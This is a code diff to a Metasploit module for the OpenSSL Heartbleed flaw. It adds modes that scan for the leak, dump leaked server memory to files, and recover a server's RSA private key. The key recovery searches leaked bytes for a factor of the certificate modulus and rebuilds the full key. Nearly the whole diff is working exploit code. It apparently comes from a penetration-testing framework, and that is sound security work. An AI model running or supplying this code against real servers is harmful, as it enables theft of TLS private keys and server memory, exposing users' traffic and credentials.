@@ -102,7 +102,8 @@ class Metasploit3 < Msf::Auxiliary
         'Christian Mehlmauer', # Msf module
         'wvu', # Msf module
         'juan vazquez', # Msf module
-        'Sebastiano Di Paola' # Msf module
+        'Sebastiano Di Paola', # Msf module
+        'jjarmoc', #Msf module; keydump, refactoring..
       ],
       'References'     =>
         [
@@ -123,7 +124,9 @@ class Metasploit3 < Msf::Auxiliary
         Opt::RPORT(443),
         OptEnum.new('STARTTLS', [true, 'Protocol to use with STARTTLS, None to avoid STARTTLS ', 'None', [ 'None', 'SMTP', 'IMAP', 'JABBER', 'POP3', 'FTP' ]]),
         OptEnum.new('TLSVERSION', [true, 'TLS/SSL version to use', '1.0', ['SSLv3','1.0', '1.1', '1.2']]),
-        OptBool.new('STOREDUMP', [true, 'Store leaked memory in a file', false]),
+        OptEnum.new('MODE', [true, 'Mode of operation', 'SCAN', ['SCAN', 'DUMP', 'KEYS']]),
+        OptInt.new('MAX_KEYTRIES', [true, 'Max tries to dump key', 10]),
+        OptInt.new('STATUS_EVERY', [true, 'How many retries until status', 5]),
         OptRegexp.new('DUMPFILTER', [false, 'Pattern to filter leaked memory before storing', nil])
       ], self.class)
 
@@ -228,26 +231,60 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def run_host(ip)
-    connect
-
-    unless datastore['STARTTLS'] == 'None'
-      vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
-      res = self.send(TLS_CALLBACKS[datastore['STARTTLS']])
-      if res.nil?
-        vprint_error("#{peer} - STARTTLS failed...")
+    case datastore['MODE']
+    when 'SCAN'
+      scan(bleed)
+    when 'DUMP'
+      scan(bleed)  # Scan & Dump are similar, scan() records results
+    when 'KEYS'
+      unless datastore['STARTTLS'] == 'None'
+        print_error('STARTTLS Currently unsupported for Keydumping mode') #TODO
         return
       end
-    end
+      print_status("#{peer} - Scanning for private keys")
+      count = 0
 
-    vprint_status("#{peer} - Sending Client Hello...")
-    sock.put(client_hello)
+      print_status("#{peer} - Getting public key constants...")
+      n, e = get_ne
+      vprint_status("#{peer} - n: #{n}")
+      vprint_status("#{peer} - e: #{e}")
+      print_status("#{peer} - #{Time.now.getutc} - Starting.")
 
-    server_hello = sock.get
-    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
-      vprint_error("#{peer} - Server Hello Not Found")
+      datastore['MAX_KEYTRIES'].times {
+        # Loop up to MAX_KEYTRIES times, looking for keys
+        if count % datastore['STATUS_EVERY'] == 0
+          print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
+        end
+
+        p, q = get_factors(bleed, n) # Try to find factors in mem
+        unless p.nil? || q.nil?
+          key = key_from_pqe(p, q, e)
+          print_good("#{peer} - #{Time.now.getutc} - Got the private key")
+
+         print_status(key.export)
+          path = store_loot(
+            "openssl.heartbleed.server",
+            "text/plain",
+            rhost,
+            key.export,
+            nil,
+            "OpenSSL Heartbleed Private Key"
+          )
+          print_status("#{peer} - Private key stored in #{path}")
+          return
+        end
+        count += 1
+      }
+    else
+      #Shouldn't get here, since MODE is Enum
+      print_error("Unknown MODE: #{datastore['MODE']}")
       return
     end
+  end
 
+  def bleed()
+    # This actually performs the heartbleed portion
+    establish_connect
     vprint_status("#{peer} - Sending Heartbeat...")
     sock.put(heartbeat(heartbeat_length))
     hdr = sock.get_once(5)
@@ -284,39 +321,44 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    vprint_status("#{peer} - Heartbeat response, checking if there is data leaked...")
-    heartbeat_data = sock.get_once(heartbeat_length) # Read the magic length...
-    if heartbeat_data
-      print_good("#{peer} - Heartbeat response with leak")
-      report_vuln({
-        :host => rhost,
-        :port => rport,
-        :name => self.name,
-        :refs => self.references,
-        :info => "Module #{self.fullname} successfully leaked info"
-      })
-      if datastore['STOREDUMP']
-        pattern = datastore['DUMPFILTER']
-        if pattern
-          match_data = heartbeat_data.scan(pattern).join
-        else
-          match_data = heartbeat_data
-        end
-        path = store_loot(
-          "openssl.heartbleed.server",
-          "application/octet-stream",
-          ip,
-          match_data,
-          nil,
-          "OpenSSL Heartbleed server memory"
-        )
-        print_status("#{peer} - Heartbeat data stored in #{path}")
-      end
-      vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
-    else
-      vprint_error("#{peer} - Looks like there isn't leaked information...")
-    end
+    heartbeat_data = sock.get(heartbeat_length) # Read the magic length...
+    vprint_status("#{peer} - Heartbeat response, #{heartbeat_data.length} bytes")
+    disconnect
+    heartbeat_data
   end
+
+  def scan(heartbeat_data)
+    if heartbeat_data
+        print_good("#{peer} - Heartbeat response with leak")
+        report_vuln({
+          :host => rhost,
+          :port => rport,
+          :name => self.name,
+          :refs => self.references,
+          :info => "Module #{self.fullname} successfully leaked info"
+        })
+        if datastore['MODE'] == 'DUMP' # Check mode, dump if requested.
+          pattern = datastore['DUMPFILTER']
+          if pattern
+            match_data = heartbeat_data.scan(pattern).join
+          else
+            match_data = heartbeat_data
+          end
+          path = store_loot(
+            "openssl.heartbleed.server",
+            "application/octet-stream",
+            rhost,
+            match_data,
+            nil,
+            "OpenSSL Heartbleed server memory"
+          )
+          print_status("#{peer} - Heartbeat data stored in #{path}")
+        end
+        vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
+      else
+        vprint_error("#{peer} - Looks like there isn't leaked information...")
+      end
+    end
 
   def heartbeat(length)
     payload = "\x01"              # Heartbeat Message Type: Request (1)
@@ -357,4 +399,82 @@ class Metasploit3 < Msf::Auxiliary
     record = [type, TLS_VERSION[datastore['TLSVERSION']], data.length].pack('Cnn')
     record << data
   end
+
+  def get_ne()
+    # Fetch rhost's cert, return public key values
+    connect(true, {"SSL" => true}) #Force SSL
+    cert  = OpenSSL::X509::Certificate.new(sock.peer_cert)
+    disconnect
+
+    if(not cert)
+      print_error("#{peer} No certificate found")
+      return
+    end
+
+    return cert.public_key.params["n"], cert.public_key.params["e"]
+  end
+
+  def get_factors(data, n)
+    # Walk through data looking for factors of n
+    psize = n.num_bits / 8 / 2
+    return if data.nil?
+
+    (0..(data.length-psize)).each{ |x|
+      # Try each offset of suitable length
+      can = OpenSSL::BN.new(data[x,psize].reverse.bytes.inject {|a,b| (a << 8) + b }.to_s)
+      if can > 1 && can % 2 != 0 && can.num_bytes == psize
+        # Only try candidates that have a chance...
+        q, rem = n / can
+        if rem == 0 && can != n
+          vprint_good("#{peer} - Found factor at offset #{x.to_s(16)}")
+          p = can
+          return p, q
+        end
+      end
+      }
+    return nil, nil
+  end
+
+  def establish_connect
+    connect
+
+    unless datastore['STARTTLS'] == 'None'
+      vprint_status("#{peer} - Trying to start SSL via #{datastore['STARTTLS']}")
+      res = self.send(TLS_CALLBACKS[datastore['STARTTLS']])
+      if res.nil?
+        vprint_error("#{peer} - STARTTLS failed...")
+        return
+      end
+    end
+
+    vprint_status("#{peer} - Sending Client Hello...")
+    sock.put(client_hello)
+
+    server_hello = sock.get
+    unless server_hello.unpack("C").first == HANDSHAKE_RECORD_TYPE
+      vprint_error("#{peer} - Server Hello Not Found")
+      return
+    end
+  end
+
+  def key_from_pqe(p, q, e)
+    # Returns an RSA Private Key from Factors
+    key = OpenSSL::PKey::RSA.new()
+
+    key.p = p
+    key.q = q
+
+    key.n = key.p*key.q
+    key.e = e
+
+    phi = (key.p - 1) * (key.q - 1 )
+    key.d = key.e.mod_inverse(phi)
+
+    key.dmp1 = key.d % (key.p - 1)
+    key.dmq1 = key.d % (key.q - 1)
+    key.iqmp = key.q.mod_inverse(key.p)
+
+    return key
+  end
+
 end
